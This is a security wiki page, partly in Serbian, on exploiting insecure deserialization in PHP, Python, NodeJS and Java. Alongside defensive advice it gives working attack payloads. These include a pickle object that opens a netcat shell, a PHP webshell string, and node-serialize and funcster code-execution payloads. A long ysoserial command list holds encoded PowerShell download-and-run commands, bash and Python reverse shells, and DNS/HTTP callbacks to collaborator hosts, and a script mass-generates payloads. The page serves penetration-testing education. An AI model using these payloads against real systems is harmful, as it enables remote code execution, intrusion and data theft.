# Deserialization

{{#include ../../banners/hacktricks-training.md}}

## Osnovne informacije

**Serialization** se smatra metodom pretvaranja objekta u format koji se može sačuvati, s namerom da se objekat ili skladišti ili prenese kao deo komunikacije. Ova tehnika se često koristi da bi se obezbedilo da se objekat može ponovo rekonstruisati kasnije, zadržavajući njegovu strukturu i stanje.

**Deserialization**, suprotno tome, je proces koji poništava Serialization. On podrazumeva uzimanje podataka koji su strukturirani u određenom formatu i ponovnu rekonstrukciju u objekat.

Deserialization može biti opasan jer potencijalno **omogućava napadačima da manipulišu serializovanim podacima kako bi izvršili štetan kod** ili izazvali neočekivano ponašanje aplikacije tokom procesa rekonstrukcije objekta.

## PHP

U PHP-u se tokom procesa serialization i deserialization koriste specifične magic metode:

- `__sleep`: Poziva se kada se objekat serializuje. Ova metoda treba da vrati niz imena svih svojstava objekta koja treba da budu serializovana. Obično se koristi za trajno čuvanje podataka koji su u čekanju ili za obavljanje sličnih zadataka čišćenja.
- `__wakeup`: Poziva se kada se objekat deserializuje. Koristi se za ponovno uspostavljanje konekcija ka bazi podataka koje su možda izgubljene tokom serialization-a i za obavljanje drugih zadataka ponovnog inicijalizovanja.
- `__unserialize`: Ova metoda se poziva umesto `__wakeup` (ako postoji) kada se objekat deserializuje. Pruža veću kontrolu nad procesom deserializacije u poređenju sa `__wakeup`.
- `__destruct`: Ova metoda se poziva kada je objekat pred uništenjem ili kada se skripta završava. Obično se koristi za čišćenje, poput zatvaranja deskriptora fajlova ili konekcija ka bazi podataka.
- `__toString`: Ova metoda omogućava da se objekat tretira kao string. Može se koristiti za čitanje fajla ili druge zadatke zasnovane na funkcijama pozvanim u njoj, efektivno pružajući tekstualnu reprezentaciju objekta.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
Ako pogledate rezultate, možete videti da se funkcije **`__wakeup`** i **`__destruct`** pozivaju kada se objekat deserializuje. Imajte u vidu da u nekoliko tutorijala piše da se funkcija **`__toString`** poziva pri pokušaju ispisa nekog atributa, ali izgleda da se to **više ne dešava**.

> [!WARNING]
> Metod **`__unserialize(array $data)`** se poziva **umesto `__wakeup()`** ako je implementiran u klasi. Omogućava da se objekat deserializuje davanjem serijalizovanih podataka kao niza. Možete koristiti ovaj metod da deserializujete svojstva i izvršite sve neophodne radnje prilikom deserializacije.
>
> ```php
> class MyClass {
>    private $property;
>
>    public function __unserialize(array $data): void {
>        $this->property = $data['property'];
>        // Perform any necessary tasks upon deserialization.
>    }
> }
> ```

Možete pročitati objašnjen **PHP primer ovde**: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), ovde [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) ili ovde [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Classes

Možete zloupotrebiti PHP autoload funkcionalnost da učitate proizvoljne php fajlove i više:


{{#ref}}
php-deserialization-+-autoload-classes.md
{{#endref}}

### Serijalizovanje referenciranih vrednosti

Ako iz nekog razloga želite da serijalizujete vrednost kao **referencu na drugu serijalizovanu vrednost**, možete:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### Sprečavanje PHP Object Injection sa `allowed_classes`

> [!INFO]
> Podrška za **drugi argument** funkcije `unserialize()` (the `$options` array) dodata je u **PHP 7.0**. Na starijim verzijama funkcija prihvata samo serijalizovani string, što onemogućava ograničavanje koje klase mogu biti instancirane.

`unserialize()` će **instancirati svaku klasu** koju pronađe u serijalizovanom streamu osim ako nije drugačije rečeno. Od PHP 7 ponašanje se može ograničiti opcijom [`allowed_classes`](https://www.php.net/manual/en/function.unserialize.php):
```php
// NEVER DO THIS – full object instantiation
$object = unserialize($userControlledData);

// SAFER – disable object instantiation completely
$object = unserialize($userControlledData, [
'allowed_classes' => false    // no classes may be created
]);

// Granular – only allow a strict white-list of models
$object = unserialize($userControlledData, [
'allowed_classes' => [MyModel::class, DateTime::class]
]);
```
Ako je **`allowed_classes` izostavljen _ili_ se kod izvršava na PHP < 7.0**, poziv postaje **opasan** jer napadač može napraviti payload koji zloupotrebljava magične metode kao što su `__wakeup()` ili `__destruct()` da bi ostvario Remote Code Execution (RCE).

#### Primer iz stvarnog sveta: Everest Forms (WordPress) CVE-2025-52709

WordPress dodatak **Everest Forms ≤ 3.2.2** pokušao je da bude defanzivan koristeći helper wrapper, ali je zaboravio na legacy PHP verzije:
```php
function evf_maybe_unserialize($data, $options = array()) {
if (is_serialized($data)) {
if (version_compare(PHP_VERSION, '7.1.0', '>=')) {
// SAFE branch (PHP ≥ 7.1)
$options = wp_parse_args($options, array('allowed_classes' => false));
return @unserialize(trim($data), $options);
}
// DANGEROUS branch (PHP < 7.1)
return @unserialize(trim($data));
}
return $data;
}
```
Na serverima koji su i dalje pokretali **PHP ≤ 7.0** ova druga grana je dovodila do klasičnog **PHP Object Injection** kada bi administrator otvorio zlonamerni formular. Minimalni exploit payload mogao bi izgledati ovako:
```
O:8:"SomeClass":1:{s:8:"property";s:28:"<?php system($_GET['cmd']); ?>";}
```
Čim je admin pregledao unos, objekat je instanciran i `SomeClass::__destruct()` je izvršen, što je rezultovalo izvršavanjem proizvoljnog koda.

**Pouke**
1. Uvek prosleđujte `['allowed_classes' => false]` (ili strogu white-list) pri pozivu `unserialize()`.
2. Revidirajte defensive wrappers – često zaboravljaju na legacy PHP grane.
3. Nadogradnja na **PHP ≥ 7.x** sama po sebi *nije* dovoljna: opcija i dalje mora biti eksplicitno prosleđena.

---

### PHPGGC (ysoserial for PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) može pomoći u generisanju payload-ova za zloupotrebu PHP deserializations.\
Imajte na umu da u nekoliko slučajeva **nećete moći pronaći način da zloupotrebite deserialization u izvornom kodu** aplikacije, ali možda možete **zloupotrebiti kod eksternih PHP ekstenzija.**\
Dakle, ako možete, proverite `phpinfo()` servera i **pretražite internet** (pa čak i **gadgets** od **PHPGGC**) za neke moguće gadget-e koje biste mogli zloupotrebiti.

### phar:// metadata deserialization

Ako ste pronašli LFI koji samo čita fajl i ne izvršava php kod unutar njega, na primer koristeći funkcije kao što su _**file_get_contents(), fopen(), file() or file_exists(), md5_file(), filemtime() or filesize()**_**.** Možete pokušati zloupotrebiti **deserialization** koja se dešava pri **čitanju** **fajla** korišćenjem **phar** protokola.\
Za više informacija pročitajte sledeći post:


{{#ref}}
../file-inclusion/phar-deserialization.md
{{#endref}}

## Python

### **Pickle**

Kada se objekat unpickle-uje, funkcija \_\_\_reduce\_\_\_ će biti izvršena.\\ Ako se iskoristi, server može vratiti grešku.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Pre nego što proverite bypass tehniku, pokušajte da koristite `print(base64.b64encode(pickle.dumps(P(),2)))` da generišete objekat koji je kompatibilan sa python2 ako pokrećete python3.

Za više informacija o bekstvu iz **pickle jails** pogledajte:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

### Yaml **&** jsonpickle

Sledeća stranica prikazuje tehniku za **abuse an unsafe deserialization in yamls** Python biblioteka i završava sa alatom koji se može koristiti za generisanje RCE deserialization payload-a za **Pickle, PyYAML, jsonpickle and ruamel.yaml**:


{{#ref}}
python-yaml-deserialization.md
{{#endref}}

### Class Pollution (Python Prototype Pollution)


{{#ref}}
../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md
{{#endref}}

## NodeJS

### JS Magic Functions

JS **nema "magic" funkcije** poput PHP-a ili Pythona koje će se izvršiti samo pri kreiranju objekta. Ali ima neke **funkcije** koje se **češće koriste čak i bez direktnog pozivanja**, kao što su **`toString`**, **`valueOf`**, **`toJSON`**.\
Ako zloupotrebite deserialization, možete **kompromitovati ove funkcije da bi se izvršio drugi kod** (potencijalno zloupotrebljavajući prototype pollutions) i tada biste mogli izvršiti arbitrary code kada se pozovu.

Još jedan **"magic" način da se pozove funkcija** bez direktnog pozivanja je kompromitovanjem objekta koji se vraća iz async funkcije (promise). Zato što, ako taj **return object** transformišete u drugi **promise** koji ima **property** nazvan **"then" of type function**, on će se **izvršiti** samo zato što ga vraća drugi promise. _Pratite_ [_**this link**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _za više informacija._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise((resolve) => {
console.log("hello")
resolve()
})
return p
}

async function test_then() {
const p = new Promise((then) => {
console.log("hello")
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` and `prototype` pollution

Ako želite da saznate više o ovoj tehnici, **pogledajte sledeći tutorijal**:


{{#ref}}
nodejs-proto-prototype-pollution/
{{#endref}}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Ova biblioteka omogućava serijalizaciju funkcija. Primer:
```javascript
var y = {
rce: function () {
require("child_process").exec("ls /", function (error, stdout, stderr) {
console.log(stdout)
})
},
}
var serialize = require("node-serialize")
var payload_serialized = serialize.serialize(y)
console.log("Serialized: \n" + payload_serialized)
```
**Serijalizovani objekat** će izgledati ovako:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
You can see in the example that when a function is serialized the `_$$ND_FUNC$$_` flag is appended to the serialized object.

Inside the file `node-serialize/lib/serialize.js` you can find the same flag and how the code is using it.

![](<../../images/image (351).png>)

![](<../../images/image (446).png>)

Kao što možete videti u poslednjem delu koda, **ako se zastavica pronađe** `eval` se koristi za deserializaciju funkcije, tako da u suštini **ulaz korisnika se koristi unutar `eval` funkcije**.

Međutim, **samo serializovanje** funkcije **je neće izvršiti**, jer bi bilo neophodno da neki deo koda **poziva `y.rce`** u našem primeru, a to je veoma malo verovatno.\
U svakom slučaju, možete jednostavno **izmeniti serializovani objekat** **dodavanjem zagrada** kako bi se serializovana funkcija automatski izvršila prilikom deserializacije objekta.\
U narednom delu koda **obratite pažnju na poslednju zagradu** i kako će funkcija `unserialize` automatski izvršiti kod:
```javascript
var serialize = require("node-serialize")
var test = {
rce: "_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()",
}
serialize.unserialize(test)
```
Kao što je ranije navedeno, ova biblioteka će uzeti kod posle `_$$ND_FUNC$$_` i će ga **izvršiti** pomoću `eval`. Stoga, da biste **automatski izvršili kod**, možete **izbrisati deo kreiranja funkcije** i poslednju zagradu i **samo izvršiti JS oneliner** kao u sledećem primeru:
```javascript
var serialize = require("node-serialize")
var test =
"{\"rce\":\"_$$ND_FUNC$$_require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })\"}"
serialize.unserialize(test)
```
Možete [**find here**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **further information** o tome kako iskoristiti ovu ranjivost.

### [funcster](https://www.npmjs.com/package/funcster)

Značajan aspekt **funcster** jeste nedostupnost **standardnih ugrađenih objekata**; oni su izvan dostupnog opsega. Ovo ograničenje sprečava izvršavanje koda koji pokušava da pozove metode na ugrađenim objektima, što dovodi do izuzetaka kao što je "ReferenceError: console is not defined" kada se koriste komande poput `console.log()` ili `require(something)`.

Uprkos ovom ograničenju, moguće je vratiti pun pristup globalnom kontekstu, uključujući sve standardne ugrađene objekte, kroz određeni pristup. Korišćenjem globalnog konteksta direktno, može se zaobići ovo ograničenje. Na primer, pristup se može ponovo uspostaviti koristeći sledeći snippet:
```javascript
funcster = require("funcster")
//Serialization
var test = funcster.serialize(function () {
return "Hello world!"
})
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = {
__js_function: 'this.constructor.constructor("console.log(1111)")()',
}
funcster.deepDeserialize(desertest2)
var desertest3 = {
__js_function:
"this.constructor.constructor(\"require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\")()",
}
funcster.deepDeserialize(desertest3)
```
**Za**[ **more information read this source**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

Pakеt serialize-javascript je dizajniran isključivo za potrebe serializacije, bez ugrađenih mogućnosti za deserializaciju. Korisnici su odgovorni za implementaciju sopstvene metode deserializacije. U zvaničnom primeru za deserializaciju serijalizovanih podataka predlaže se direktna upotreba `eval`:
```javascript
function deserialize(serializedJavascript) {
return eval("(" + serializedJavascript + ")")
}
```
Ako se ova funkcija koristi za deserialize objects, možete je **lako iskoristiti**:
```javascript
var serialize = require("serialize-javascript")
//Serialization
var test = serialize(function () {
return "Hello world!"
})
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test =
"function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**Za**[ **more information read this source**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryo library

U narednim stranicama možete pronaći informacije o tome kako zloupotrebiti ovu biblioteku za izvršavanje proizvoljnih komandi:

- [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
- [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

U Javi, **deserialization callbacks are executed during the process of deserialization**. Ovo izvršavanje može biti iskorišćeno od strane napadača koji kreiraju malicious payloads koji aktiviraju ove callbacks, što može dovesti do izvršenja štetnih radnji.

### Fingerprints

#### White Box

Da biste identifikovali potencijalne serialization ranjivosti u kodu, potražite:

- Classes that implement the `Serializable` interface.
- Usage of `java.io.ObjectInputStream`, `readObject`, `readUnshare` functions.

Obratite posebnu pažnju na:

- `XMLDecoder` koji se koristi sa parametrima definisanim od strane eksternih korisnika.
- `XStream`'s `fromXML` metoda, posebno ako je verzija XStream-a manja ili jednaka 1.46, jer je podložna serialization problemima.
- `ObjectInputStream` u kombinaciji sa metodom `readObject`.
- Implementacija metoda kao što su `readObject`, `readObjectNodData`, `readResolve`, ili `readExternal`.
- `ObjectInputStream.readUnshared`.
- Opšta upotreba `Serializable`.

#### Black Box

Za black box testiranje, tražite specifične **signatures or "Magic Bytes"** koji označavaju java serialized objects (potekle iz `ObjectInputStream`):

- Hexadecimal pattern: `AC ED 00 05`.
- Base64 pattern: `rO0`.
- HTTP response headers with `Content-type` set to `application/x-java-serialized-object`.
- Hexadecimal pattern indicating prior compression: `1F 8B 08 00`.
- Base64 pattern indicating prior compression: `H4sIA`.
- Web files with the `.faces` extension and the `faces.ViewState` parameter. Otkrivanje ovih obrazaca u web aplikaciji treba da podstakne ispitivanje kako je opisano u [post about Java JSF ViewState Deserialization](java-jsf-viewstate-.faces-deserialization.md).
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### Proverite da li je ranjiv

Ako želite da **learn about how does a Java Deserialized exploit work** treba da pogledate [**Basic Java Deserialization**](basic-java-deserialization-objectinputstream-readobject.md), [**Java DNS Deserialization**](java-dns-deserialization-and-gadgetprobe.md), и [**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md).

#### SignedObject-gated deserialization and pre-auth reachability

Moderni kod ponekad obavija deserializaciju sa `java.security.SignedObject` i validira potpis pre poziva `getObject()` (koji deserializuje unutrašnji objekat). Ovo sprečava proizvoljne top-level gadget klase, ali i dalje može biti iskoristivo ako attacker može da pribavi validan potpis (npr. private-key kompromitacija ili signing oracle). Pored toga, tokovi za rukovanje greškama mogu izgenerisati session-bound tokens za unauthenticated users, izlažući inače zaštićene sinks pre-auth.

Za konkretnu studiju slučaja sa requests, IoCs, i hardening guidance, pogledajte:

{{#ref}}
java-signedobject-gated-deserialization.md
{{#endref}}

#### White Box Test

Možete proveriti da li je instalirana bilo koja aplikacija sa poznatim ranjivostima.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
You could try to **proverite sve biblioteke** known to be vulnerable and that [**Ysoserial** ](https://github.com/frohoff/ysoserial)can provide an exploit for. Or you could check the libraries indicated on [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
You could also use [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) to search for possible gadget chains that can be exploited.\
When running **gadgetinspector** (after building it) don't care about the tons of warnings/errors that it's going through and let it finish. It will write all the findings under _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_. Please, notice that **gadgetinspector won't create an exploit and it may indicate false positives**.

#### Black Box Test

Using the Burp extension [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) you can identify **which libraries are available** (and even the versions). With this information it could be **easier to choose a payload** to exploit the vulnerability.\
[**Read this to learn more about GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe is focused on **`ObjectInputStream` deserializations**.

Using Burp extension [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) you can **identify vulnerable libraries** exploitable with ysoserial and **exploit** them.\
[**Read this to learn more about Java Deserialization Scanner.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner is focused on **`ObjectInputStream`** deserializations.

You can also use [**Freddy**](https://github.com/nccgroup/freddy) to **detect deserializations** vulnerabilities in **Burp**. This plugin will detect **not only `ObjectInputStream`** related vulnerabilities but **also** ranjivosti from **Json** an **Yml** deserialization libraries. In active mode, it will try to confirm them using sleep or DNS payloads.\
[**You can find more information about Freddy here.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Serialization Test**

Not all is about checking if any vulnerable library is used by the server. Sometimes you could be able to **change the data inside the serialized object and bypass some checks** (maybe grant you admin privileges inside a webapp).\
If you find a java serialized object being sent to a web application, **you can use** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **to print in a more human readable format the serialization object that is sent**. Knowing which data are you sending would be easier to modify it and bypass some checks.

### **Exploit**

#### **ysoserial**

The main tool to exploit Java deserializations is [**ysoserial**](https://github.com/frohoff/ysoserial) ([**download here**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). You can also consider using [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) which will allow you to use complex commands (with pipes for example).\
Note that this tool is **focused** on exploiting **`ObjectInputStream`**.\
I would **start using the "URLDNS"** payload **before a RCE** payload to test if the injection is possible. Anyway, note that maybe the "URLDNS" payload is not working but other RCE payload is.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
Kada kreirate payload za **java.lang.Runtime.exec()** ne možete koristiti specijalne karaktere kao što su ">" ili "|" za preusmeravanje izlaza izvršenja, "$()" za pokretanje komandi ili čak **prosleđivanje argumenata** komandi razdvojenih **razmacima** (možete uraditi `echo -n "hello world"` ali ne možete uraditi `python2 -c 'print "Hello world"'`). Da biste ispravno enkodovali payload, možete [use this webpage](http://www.jackson-t.ca/runtime-exec-payloads.html).

Slobodno upotrebite sledeći skript da kreirate **all the possible code execution** payloads za Windows i Linux i zatim ih testirate na ranjivoj web stranici:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

Možete **koristiti** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **zajedno sa ysoserial da kreirate više exploits-a**. Više informacija o ovom alatu nalazi se u **slajdovima prezentacije** na kojoj je alat predstavljen: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1)

#### marshalsec

[**marshalsec** ](https://github.com/mbechler/marshalsec) može se koristiti za generisanje payloads-a koji služe za exploit različitih **Json** i **Yml** serialization biblioteka u Java.\
Da bih kompajlirao projekat, morao sam da **dodam** ove **dependencies** u `pom.xml`:
```html
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Instalirajte maven**, i **kompajlirajte** projekat:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

Pročitajte više o ovoj Java JSON biblioteci: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Laboratorije

- If you want to test some ysoserial payloads you can **pokrenuti ovu web aplikaciju**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
- [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Zašto

Java široko koristi serijalizaciju za različite svrhe kao što su:

- **HTTP requests**: Serijalizacija se široko koristi u upravljanju parametrima, ViewState-om, cookies-ima, itd.
- **RMI (Remote Method Invocation)**: Java RMI protokol, koji se u potpunosti oslanja na serijalizaciju, predstavlja kamen temeljac za udaljenu komunikaciju u Java aplikacijama.
- **RMI over HTTP**: Ova metoda se često koristi kod Java web aplikacija sa thick client-om, pri čemu se za svu komunikaciju objekata koristi serijalizacija.
- **JMX (Java Management Extensions)**: JMX koristi serijalizaciju za prenos objekata preko mreže.
- **Custom Protocols**: U Java-i, standardna praksa podrazumeva slanje raw Java objekata, što će biti demonstrirano u narednim primerima exploit-a.

### Prevencija

#### Transient objects

Klasa koja implementira `Serializable` može označiti kao `transient` bilo koji objekat unutar klase koji ne bi trebalo da bude serijalizovan. Na primer:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Izbegavanje serializacije klase koja mora da implementira Serializable

U scenarijima gde određeni **objekti moraju da implementiraju the `Serializable`** interfejs zbog hijerarhije klasa, postoji rizik od nenamerne deserializacije. Da biste to sprečili, obezbedite da ti objekti ne budu deserializabilni tako što ćete definisati `final` metodu `readObject()` koja dosledno baca izuzetak, kao što je prikazano ispod:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Poboljšanje bezbednosti deserializacije u Javi**

**Prilagođavanje `java.io.ObjectInputStream`** je praktičan pristup za osiguravanje procesa deserializacije. Ova metoda je pogodna kada:

- Kod za deserializaciju je pod vašom kontrolom.
